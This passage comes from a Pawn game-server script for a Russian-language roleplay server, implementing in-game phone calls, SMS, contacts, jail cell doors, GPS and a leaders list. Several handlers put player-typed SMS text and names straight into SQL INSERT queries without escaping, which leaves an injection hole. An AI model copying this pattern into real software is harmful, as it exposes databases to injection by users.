	static const fmt_string[] = "%s посмотрел(а) на часы";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	ApplyAnimation(playerid,"COP_AMBIENT","Coplook_watch",4.0,0,0,0,0,0,1);
	return true;
}
CMD:togphone(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
    if(PlayerInfo[playerid][pPhone] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет телефона");
    if(GetPVarInt(playerid,"Razgovor") > 0) return SendClientMessage(playerid,CGREY,"Вы разговариваете с кем-то по телефону");
    switch(PhoneLock[playerid])
    {
        case 0:
        {
            PhoneLock[playerid] = true;
			static const fmt_string[] = "%s достает телефон и отключает его";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "достает телефон и отключает его", COLOR_PURPLE, 30.0, 7000);
        }
		case 1:
		{
            PhoneLock[playerid] = false;
			static const fmt_string[] = "%s достает телефон и включает его";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "достает телефон и включает его", COLOR_PURPLE, 30.0, 7000);
		}
    }
	return true;
}
CMD:p(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPVarInt(playerid,"Zvon") == 0) return SendClientMessage(playerid,CGREY,"Вам никто не звонит");
    if(GetPVarInt(GetPVarInt(playerid,"ZvonID"),"Zvonit") == 0) return SendClientMessage(playerid,CGREY,"Игрок вам не звонил");
   	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	SetPVarFloat(playerid,"PhoneX",x);
	SetPVarFloat(playerid,"PhoneY",y);
	SetPVarFloat(playerid,"PhoneZ",z);
    if(GetPVarInt(GetPVarInt(playerid,"ZvonID"),"Razgovor") > 0)
    {
		SendClientMessage(playerid,CGREY,"Игрок уже с кем-то разговаривает");
	    DeletePVar(playerid,"Zvon");
	    DeletePVar(playerid,"ZvonID");
	    return true;
    }
	if(GetPVarInt(playerid,"Razgovor") > 0) return SendClientMessage(playerid,CGREY,"Вы уже разговариваете с кем-то по телефону");
	static const fmt_string[] = "%s достает телефон и отвечает звонок";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	SetPlayerChatBubble(playerid, "достает телефон и отвечает звонок", COLOR_PURPLE, 30.0, 7000);
    SendClientMessage(playerid,CREWARD,"Вы ответили на звонок");
    SendClientMessage(GetPVarInt(playerid,"ZvonID"),CREWARD,"Игрок ответил на звонок");
    SetPVarInt(playerid,"Razgovor",1);
    SetPVarInt(GetPVarInt(playerid,"ZvonID"),"Razgovor",1);
    SetPVarInt(GetPVarInt(playerid,"ZvonID"),"Zvon",1);
    SetPVarInt(GetPVarInt(playerid,"ZvonID"),"ZvonID",playerid);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
	SetPlayerAttachedObject(playerid, 2, 330, 6);
    return true;
}


CMD:h(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPVarInt(playerid,"Zvon") > 0 || GetPVarInt(playerid,"ZvonStudio") > 0 || GetPVarInt(playerid,"Razgovor") > 0)
    {
        if(GetPVarInt(playerid,"Razgovor") > 0)
	    {
		    SetPlayerSpecialAction(playerid, 0);
		    if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
		    DeletePVar(GetPVarInt(playerid,"ZvonID"),"Razgovor");
		    DeletePVar(playerid,"Razgovor");
	    }
	    else
	    {
        	if(GetPVarInt(GetPVarInt(playerid,"ZvonID"),"Zvonit") == 0) return SendClientMessage(playerid,CGREY,"Игрок вам не звонил");
        }
	    SendClientMessage(playerid,CREWARD,"Вы сбросили звонок");
	    SendClientMessage(GetPVarInt(playerid,"ZvonID"),CREWARD,"Игрок сбросил звонок");
	   	new Float:x,Float:y,Float:z;
		GetPlayerPos(playerid,x,y,z);
		SetPVarFloat(playerid,"PhoneX",x);
		SetPVarFloat(playerid,"PhoneY",y);
		SetPVarFloat(playerid,"PhoneZ",z);
	    
	    if(GetPVarInt(playerid,"ZvonStudio") > 0)
	    {
			static const fmt_string[] = "[R] %s сбросил вызов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+4];
			format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername]);
			SendFMes(F_NEWS,COLOR_SKLAD,str);
			DeletePVar(playerid,"ZvonStudio");
			DeletePVar(playerid,"EfirZvon");
	    }
	    SetPlayerSpecialAction(GetPVarInt(playerid,"ZvonID"), 0);
	    if(IsPlayerAttachedObjectSlotUsed(GetPVarInt(playerid,"ZvonID"), 2)) RemovePlayerAttachedObject(GetPVarInt(playerid,"ZvonID"), 2);
	    if(!GetPVarInt(playerid,"Budka"))
	    {
			static const fmt_string[] = "%s достает телефон и сбрасывает звонок";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "достает телефон и сбрасывает звонок", COLOR_PURPLE, 30.0, 7000);
		}
		DeletePVar(playerid,"Budka");
		DeletePVar(GetPVarInt(playerid,"ZvonID"),"Budka");
	    DeletePVar(playerid,"Zvon");
	    DeletePVar(GetPVarInt(playerid,"ZvonID"),"ZvonID");
	    DeletePVar(GetPVarInt(playerid,"ZvonID"),"Zvonit");
		return DeletePVar(playerid,"ZvonID");
	}
	else SendClientMessage(playerid,CGREY,"Вам никто не звонит");
	return true;
}
stock SmsDrugs(playerid,text[])
{
	static const fmt_string[] = "<< [SMS]{FFFFFF} Неизвестно: %s | Телефон: %d";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+50+4];
	format(str, sizeof(str),fmt_string, text,NumberDrugs);
    return SendClientMessage(playerid,CREWARD,str);
}
CMD:sms(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(PlayerInfo[playerid][pPhone] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет телефона");
    new text[60];
    if(sscanf(params, "is[60]", params[0],text)) return SendClientMessage(playerid, CGREY, "Используйте: /sms [номер телефона] [текст]");
	if(PlayerInfo[playerid][pPhoneBal] < 2) return SendClientMessage(playerid,CGREY,"Недостаточно денег на счету телефона");
	PlayerInfo[playerid][pPhoneBal] -= 2;
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	SetPVarFloat(playerid,"PhoneX",x);
	SetPVarFloat(playerid,"PhoneY",y);
	SetPVarFloat(playerid,"PhoneZ",z);
	if(params[0] == NumberDrugs)
	{
	    if(!IsAGang(playerid) && IsAMafia(playerid)) return SendClientMessage(playerid,CGREY,"Данный телефон вне зоны доступа");
	    new str[110];
		format(str, sizeof(str), ">> [SMS]{FFFFFF} %s[%d]: %s | Телефон: %i",PlayerInfo[playerid][pSendername],playerid,text,PlayerInfo[playerid][pPhone]);
		SendClientMessage(playerid,CREWARD,str);
	    if(PlayerInfo[playerid][pWanted]) return SmsDrugs(playerid,"Ты находишься в розыске, парень");
		SmsDrugs(playerid,"Перейдем к делу");
	    ShowPlayerDialog(playerid,343,DIALOG_STYLE_INPUT,"Незивестный","{ffffff}Введите сколько Вам надо:","Далее","Отмена");
	    return 1;
	}
	if(params[0] == 7777)
	{
	    if(sms == false) return SendClientMessage(playerid,CGREY,"Студия не принимает SMS");
		if(PlayerInfo[playerid][pPhoneBal] < AdSms) return SendClientMessage(playerid,CGREY,"Недостаточно денег на счету телефона");
		PlayerInfo[playerid][pPhoneBal] -= AdSms;
		Kazna += AdSms*30/100;
  		SetMatsInt("kazna",Kazna);
		static const fmt_string[] = "[R] %s прислал SMS в студию: %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+4];
		format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername],text);
		SendFMes(F_NEWS,COLOR_SKLAD,str);
		static const fmt_string1[] = "%s достает телефон и набирает сообщение";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
		return SetPlayerChatBubble(playerid, "достает телефон и набирает сообщение", COLOR_PURPLE, 30.0, 7000);
	}
    new kek = -1;
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		if(PlayerInfo[i][pPhone] == params[0]) kek = i;
	}
	if(kek == -1) return SendClientMessage(playerid,CGREY,"Данный телефон вне зоны доступа");
	if(PlayerInfo[kek][pPhone] == 0) return SendClientMessage(playerid,CGREY,"У Игрока нет телефона");
	if(PhoneLock[kek] == true) return SendClientMessage(playerid,CGREY,"У Игрока выключен телефон");
	query = "";
	format(query, sizeof(query), "SELECT * FROM blacklist WHERE num = '%d' AND id1 = '%d'", PlayerInfo[playerid][pPhone], PlayerInfo[kek][pID]);
	mysql_tquery(mysql, query, "CheckBlackListPhone", "dds", playerid,kek,text);
/*	format(query, sizeof(query), "SELECT * FROM blacklist WHERE num = '%d' AND id1 = '%d'", PlayerInfo[playerid][pPhone], PlayerInfo[kek][pID]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid,CGREY,"Данный телефон вне зоны доступа");
	    mysql_free_result();
	    return true;
	}
	format(query,sizeof(query),"INSERT INTO `phonesms` ( `id1`, `id2`, `sms`, `time`) VALUES ('%s','%s','%s','%d' )",PlayerInfo[playerid][pSendername],PlayerInfo[kek][pSendername],text,gettime());
	mysql_tquery(mysql,query);
    format(query,sizeof(query),"INSERT INTO `phonesms` ( `id1`, `id2`, `sms`, `time`) VALUES ('%s','%s','%s','%d' )",PlayerInfo[kek][pSendername],PlayerInfo[playerid][pSendername],text,gettime());
	mysql_tquery(mysql,query);

    new str[110];
	format(str, sizeof(str), ">> [SMS]{FFFFFF} %s[%d]: %s | Телефон: %i",PlayerInfo[playerid][pSendername],playerid,text,PlayerInfo[playerid][pPhone]);
	SendClientMessage(playerid,CREWARD,str);
	format(str, sizeof(str), "<< [SMS]{FFFFFF} %s[%d]: %s | Телефон: %i",PlayerInfo[playerid][pSendername],playerid,text,PlayerInfo[playerid][pPhone]);
	SendClientMessage(kek,CREWARD,str);
	static const fmt_string1[] = "%s достает телефон и набирает сообщение";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
	SetPlayerChatBubble(playerid, "достает телефон и набирает сообщение", COLOR_PURPLE, 30.0, 7000);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
	    if(kek == CheckSMS[i] || playerid == CheckSMS[i] )
	    {
			static const fmt_string2[] = "[SMS] От %s к %s: %s";
			new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME+32+60];
			format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername],PlayerInfo[kek][pSendername],text);
			SendClientMessage(playerid,CREWARD,str2);
	    }
	}*/
	return true;
}
function CheckBlackListPhone(playerid,kek,text[])
{
    if(cache_get_row_count(mysql)>0) return SendClientMessage(playerid,CGREY,"Данный телефон вне зоны доступа");
    else
    {
        query = "";
        format(query,sizeof(query),"INSERT INTO `phonesms` ( `id1`, `id2`, `sms`, `time`) VALUES ('%s','%s','%s','%d' )",PlayerInfo[playerid][pSendername],PlayerInfo[kek][pSendername],text,gettime());
		mysql_tquery(mysql,query);
		query = "";
	    format(query,sizeof(query),"INSERT INTO `phonesms` ( `id1`, `id2`, `sms`, `time`) VALUES ('%s','%s','%s','%d' )",PlayerInfo[kek][pSendername],PlayerInfo[playerid][pSendername],text,gettime());
		mysql_tquery(mysql,query);

	    new str[110];
		format(str, sizeof(str), ">> [SMS]{FFFFFF} %s[%d]: %s | Телефон: %i",PlayerInfo[playerid][pSendername],playerid,text,PlayerInfo[playerid][pPhone]);
		SendClientMessage(playerid,CREWARD,str);
		format(str, sizeof(str), "<< [SMS]{FFFFFF} %s[%d]: %s | Телефон: %i",PlayerInfo[playerid][pSendername],playerid,text,PlayerInfo[playerid][pPhone]);
		SendClientMessage(kek,CREWARD,str);
		static const fmt_string1[] = "%s достает телефон и набирает сообщение";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
		SetPlayerChatBubble(playerid, "достает телефон и набирает сообщение", COLOR_PURPLE, 30.0, 7000);
		static const fmt_string2[] = "[SMS] От %s к %s: %s";
		new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME+32+60];
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		    if(kek == CheckSMS[i] || playerid == CheckSMS[i])
		    {
			
				format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername],PlayerInfo[kek][pSendername],text);
				SendClientMessage(playerid,CREWARD,str2);
		    }
		}
    }
    return 1;
}
CMD:phone(playerid)
{
    if(PlayerInfo[playerid][pPhone] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет телефона");
    static const fmt_string2[] = "Статус: %s\n\
	Баланс: %d$\n\
	Сообщения\n\
	Звонки\n\
	Контакты\n\
	Черный список";
	new str2[sizeof(fmt_string2)+25+5];
	format(str2, sizeof(str2), fmt_string2,(PhoneLock[playerid]) ? ("{F85A5A}[Выключен]{FFFFFF}") : ("{20BA09}[Включен]{FFFFFF}"),PlayerInfo[playerid][pPhoneBal]);
	ShowPlayerDialog(playerid,417,DIALOG_STYLE_LIST,"Телефон",str2,"Далее","Отмена");
	return 1;
}
/*CMD:phone(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(PlayerInfo[playerid][pPhone] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет телефона");
    format(query, sizeof(query), "SELECT * FROM phone WHERE id1 = '%d'",PlayerInfo[playerid][pID]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	new srrt[1000],kek;
 	strcat(srrt, "{20BA09}Создать контакт\n{FFFFFF}");
	if(mysql_num_rows() > 0)
	{
		for(new i = 0; i <= mysql_num_rows();i++)
		{
			if(mysql_fetch_row_format(query))
   			{
				new sos[16],sos1[16],sas,sos22[10];
				mysql_get_field("name", sos);
				mysql_get_field("num", sos1);
				sas = strval(sos1);
				new str[50];
				format(str,sizeof(str),"Имя: %s | Номер: %i\n",sos,sas);
				strcat(srrt, str);
				ListNick[playerid][kek] = sas;
    			kek++;
    			if(kek >= 15)
				{
				    mysql_get_field("id", sos22);
				    SetPVarInt(playerid,"CheckPlayer",strval(sos22));
				    break;
				}
    			
			}
		}
				
		
		mysql_free_result();
		if(GetPVarInt(playerid,"CheckPlayer")) strcat(srrt, "\nДалее >>");
		
	}
	ShowPlayerDialog(playerid,340,DIALOG_STYLE_LIST,"Список контактов",srrt,"Закрыть","");
	else SendClientMessage(playerid,CGREY,"Ваша записаная книжка пуста. Добавить: /phoneadd");
	return true;
}
CMD:phonedelete(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(PlayerInfo[playerid][pPhone] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет телефона");
    new phone;
    if(sscanf(params, "i",phone)) return SendClientMessage(playerid, CGREY, "Используйте: /phonedelete [номер телефона]");
    format(query, sizeof(query), "SELECT * FROM phone WHERE num = '%d' AND id1 = '%d'", phone,PlayerInfo[playerid][pID]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера телефона нет в вашем списке контактов");
	    mysql_free_result();
	    return true;
	}
	format(query, sizeof(query), "DELETE FROM phone WHERE id = '%d' AND id1 = '%d'", params[0],PlayerInfo[playerid][pID]);
	mysql_tquery(mysql,query);
	return SendClientMessage(playerid,-1,"Данной номер телефона убран из вашего списка контактов");
}
CMD:phoneadd(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(PlayerInfo[playerid][pPhone] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет телефона");
    new phone;
    if(sscanf(params, "is[32]",phone,params)) return SendClientMessage(playerid, CGREY, "Используйте: /phoneadd [номер телефона] [имя контакта]");
    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE phone = '%d'", phone);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера телефона не зарегистрирован");
	    mysql_free_result();
	    return true;
	}
	format(query, sizeof(query), "SELECT * FROM phone WHERE num = '%d' AND id1 = '%d'", phone, PlayerInfo[playerid][pID]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера уже есть в Вашей записной книжке");
	    mysql_free_result();
	    return true;
	}
	format(query, sizeof(query), "INSERT INTO phone (id1,name,num) VALUES ('%d', '%s','%d')", PlayerInfo[playerid][pID],params,phone);
	mysql_tquery(mysql,query);
	return SendClientMessage(playerid,-1,"Данной номер телефона добавлен в ваши контакты");
}*/
CMD:call(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(PlayerInfo[playerid][pPhone] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет телефона");
    if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /call [номер телефона]");
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	SetPVarFloat(playerid,"PhoneX",x);
	SetPVarFloat(playerid,"PhoneY",y);
	SetPVarFloat(playerid,"PhoneZ",z);
	if(params[0] == 911)
	{
		ShowPlayerDialog(playerid,123,DIALOG_STYLE_LIST,"Экстренный вызов","{FFFFFF}Полиция\nСкорая помощь\nТакси\nМеханик","Далее","Назад");
		static const fmt_string2[] = "%s достает телефон и набирает номер";
		new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME];
		format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str2);
		return SetPlayerChatBubble(playerid, "достает телефон и набирает номер", COLOR_PURPLE, 30.0, 7000);
	}
	if(PlayerInfo[playerid][pPhoneBal] < 5) return SendClientMessage(playerid,CGREY,"Недостаточно денег на счету телефона");
	PlayerInfo[playerid][pPhoneBal] -= 5;
	if(params[0] == 7777)
	{
		if(PlayerInfo[playerid][pPhoneBal] < AdZvon) return SendClientMessage(playerid,CGREY,"Недостаточно денег на счету телефона");
		PlayerInfo[playerid][pPhoneBal] -= AdZvon;
		if(zvon == false) return SendClientMessage(playerid,CGREY,"Студия не принимает звонков");
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
		Kazna += AdZvon*30/100;
  		SetMatsInt("kazna",Kazna);
		SetPlayerAttachedObject(playerid, 2, 330, 6);
		static const fmt_string[] = "[R] %s звонит в студию. Принять вызов: /acall %i";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+4];
		format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername],playerid);
		SendFMes(F_NEWS,COLOR_SKLAD,str);
		static const fmt_string2[] = "%s достает телефон и набирает номер";
		new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME];
		format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str2);
		SetPlayerChatBubble(playerid, "достает телефон и набирает номер", COLOR_PURPLE, 30.0, 7000);
		return SetPVarInt(playerid,"ZvonStuidio",1);
	}
    CallPlayer(playerid,params[0]);
	return 1;
}
stock CallPlayer(playerid,phone)
{
    new kek = -1;
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		if(PlayerInfo[i][pPhone] == phone) kek = i;
	}
    if(kek == -1) return SendClientMessage(playerid,CGREY,"Данный телефон вне зоны доступа");
	if(PlayerInfo[kek][pPhone] == 0) return SendClientMessage(playerid,CGREY,"У Игрока нет телефона");
	if(PhoneLock[kek] == true) return SendClientMessage(playerid,CGREY,"У Игрока выключен телефон");
	query = "";
	format(query, sizeof(query), "SELECT * FROM blacklist WHERE num = '%d' AND id1 = '%d'", PlayerInfo[playerid][pPhone], PlayerInfo[kek][pID]);
	mysql_tquery(mysql, query, "CheckBlackListForCall", "dd", playerid,kek);
/*	format(query, sizeof(query), "SELECT * FROM blacklist WHERE num = '%d' AND id1 = '%d'", PlayerInfo[playerid][pPhone], PlayerInfo[kek][pID]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid,CGREY,"Данный телефон вне зоны доступа");
	    mysql_free_result();
	    return true;
	}*/
	
	return 1;
}
function CheckBlackListForCall(playerid,kek)
{
    if(cache_get_row_count(mysql)>0) SendClientMessage(playerid,CGREY,"Данный телефон вне зоны доступа");
	else
	{
	    static const fmt_string[] = "[TEL] {FFFFFF}Вам звонит %s. Принять /p | Cбросить /h";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
		SendClientMessage(kek,CREWARD,str);
		new Float:slx, Float:sly, Float:slz;
		GetPlayerPos(kek,slx,sly,slz);
		PlayerPlaySound(kek, 31204, slx, sly, slz+5);
		static const fmt_string1[] = "[TEL]{FFFFFF} Вы звоните %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[kek][pSendername]);
		SendClientMessage(playerid,CREWARD,str1);
		SetPVarInt(kek,"Zvon",1);
		SetPVarInt(kek,"ZvonID",playerid);
		SetPVarInt(playerid,"Zvonit",1);
		if(!GetPVarInt(playerid,"Budka"))
		{
		    query = "";
			format(query,sizeof(query),"INSERT INTO `phonesms` ( `id1`, `id2`, `sms`, `time`, `type`) VALUES ('%s','%s','{F85A5A}Исходящий','%d','1' )",PlayerInfo[playerid][pSendername],PlayerInfo[kek][pSendername],gettime());
			mysql_tquery(mysql,query);
			query = "";
			format(query,sizeof(query),"INSERT INTO `phonesms` ( `id1`, `id2`, `sms`, `time`, `type`) VALUES ('%s','%s','{20BA09}Входящий','%d','1' )",PlayerInfo[kek][pSendername],PlayerInfo[playerid][pSendername],gettime());
			mysql_tquery(mysql,query);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
			SetPlayerAttachedObject(playerid, 2, 330, 6);
			static const fmt_string2[] = "%s достает телефон и набирает номер";
			new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME];
			format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str2);
			return SetPlayerChatBubble(playerid, "достает телефон и набирает номер", COLOR_PURPLE, 30.0, 7000);
		}
	}
	return 1;
}
CMD:gv(playerid) return printf("Streamer_GetVisibleItems: %d",Streamer_GetVisibleItems(STREAMER_TYPE_OBJECT));
CMD:cell(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(IsACop(playerid) ||  PlayerInfo[playerid][pMember] == F_MAYOR)
    {
        if(IsPlayerInRangeOfPoint(playerid, 2.0, -0.870700, -12.631999, 1999.805541))
        {
            if(IsDynamicObjectMoving(cell[0]) || IsDynamicObjectMoving(cell[1])) return 1;
            MoveDynamicObject(cell[0],-1.9107, -12.631999, 1999.805541,2);
            MoveDynamicObject(cell[1],1.7991,  -12.619000, 1999.805541,2);
            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[0],-0.870700, -12.631999, 1999.805541,2.0);
            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[1],0.879100, -12.619000, 1999.805541,2.0);
		}
		for(new i = 2; i <= 17; i++)
		{
			new Float:x,Float:y,Float:z;
			GetDynamicObjectPos(cell[i],x,y,z);
			if(IsPlayerInRangeOfPoint(playerid, 2.0, x,y,z))
	        {
	            if(IsDynamicObjectMoving(cell[i])) continue;
	            MoveDynamicObject(cell[i],x, y + 1.3, z,2);
	            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[i],x,y,z,2.0);
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, -2.364000, -37.900001, 1999.805541))
        {
        	if(IsDynamicObjectMoving(cell[18])) return 1;
            MoveDynamicObject(cell[18],-2.364000 - 1.3, -37.900001, 1999.805541,2);
            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[18],-2.364000, -37.900001, 1999.805541,2.0);
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 2.364000, -37.900001, 1999.805541))
        {
            if(IsDynamicObjectMoving(cell[19])) return 1;
            MoveDynamicObject(cell[19],2.364000 + 1.3, -37.900001, 1999.805541,2);
            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[19],2.364000, -37.900001, 1999.805541,2.0);
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0,4.558300, -42.568000, 1998.579223))
        {
            if(IsDynamicObjectMoving(cell[20])) return 1;
            MoveDynamicObject(cell[20],4.558300, -42.568000, 1996.0851,2);
            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[20],4.558300, -42.568000, 1998.579223,2.0);
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0,-4.558300, -42.568000, 1998.579223))
        {
            if(IsDynamicObjectMoving(cell[21])) return 1;
            MoveDynamicObject(cell[21],-4.558300, -42.568000, 1996.0851,2);
            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[21],-4.558300, -42.568000, 1998.579223,2.0);
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0,-4.564000, -40.250000, 2002.020019))
        {
            if(IsDynamicObjectMoving(cell[22])) return 1;
            MoveDynamicObject(cell[22],-4.564000, -40.250000,2004.5898,2);
            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[22],-4.564000, -40.250000, 2002.020019,2.0);
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0,4.564000, -40.250000, 2002.020019))
        {
            if(IsDynamicObjectMoving(cell[23])) return 1;
            MoveDynamicObject(cell[23],4.564000, -40.250000, 2004.5898,2);
            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[23],4.564000, -40.250000, 2002.020019,2.0);
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0,-0.779999, -47.546501, 2002.020019))
        {
            if(IsDynamicObjectMoving(cell[24])) return 1;
            MoveDynamicObject(cell[24],-0.779999, -47.546501, 2004.5898,2);
            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[24],-0.779999, -47.546501, 2002.020019,2.0);
		}
    }
    return true;
}

CMD:gps(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPVarInt(playerid,"Mar") > 0 && GetPVarInt(playerid,"Mar") < 4 || GetPVarInt(playerid,"Mar") == 6 || GetPVarInt(playerid,"InDrift")) return SendClientMessage(playerid,CGREY,"Нельзя использовать GPS на работе");
	if(GetPVarInt(playerid,"GPS") > 0) DisablePlayerRaceCheckpoint(playerid),DeletePVar(playerid,"GPS");
	ShowPlayerDialog(playerid,67,DIALOG_STYLE_LIST,"GPS","{FFFFFF}1 | Основное\n2 | База организаций\n3 | Работы\n4 | Авторынки\n5 | Развлечения\n6 | Дальнобойщики\n7 | Бизнесы\n8 | Ближайшие места","Далее","Назад");
    return true;
}
CMD:end(playerid)
{
	if(!GetPVarInt(playerid,"Mar")) return SendClientMessage(playerid,CGREY,"Вы не работаете!");
    if(GetPVarInt(playerid,"SekBus"))
    {
        SendClientMessage(playerid,CREWARD,"Вы закончили работу. Зарплату вы получите во время PayDay.");
        ClearJob(playerid);
    }
    else SendClientMessage(playerid,CGREY,"Выйдите из рабочего транспорта!");
    return 1;
}




CMD:leaders(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
	new kek = 0;
	new str44[500];
	strcat(str44,"{FFFFFF}[#] Организация | Лидер | Телефон\n\n");
	static const fmt_string[] = "[%i] %s | %s[%d] (%d/3)| Тел. %s\n";
	new str[sizeof(fmt_string)+2+50+MAX_PLAYER_NAME+4+7];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
        if(PlayerInfo[i][pLeader] > 0)
        {
    		new krek[10];
		   	if(PlayerInfo[i][pPhone] == 0) format(krek,sizeof(krek),"Нет");
			else format(krek,sizeof(krek),"%i",PlayerInfo[i][pPhone]);
    		
			format(str, sizeof(str), fmt_string,kek+1,FracInfo[PlayerInfo[i][pLeader]][fName],PlayerInfo[i][pSendername],i,PlayerInfo[i][pLWarn],krek);
			strcat(str44,str);
			kek++;
		}
	}
	if(kek == 0) strcat(str44,"Нет лидеров онлайн");
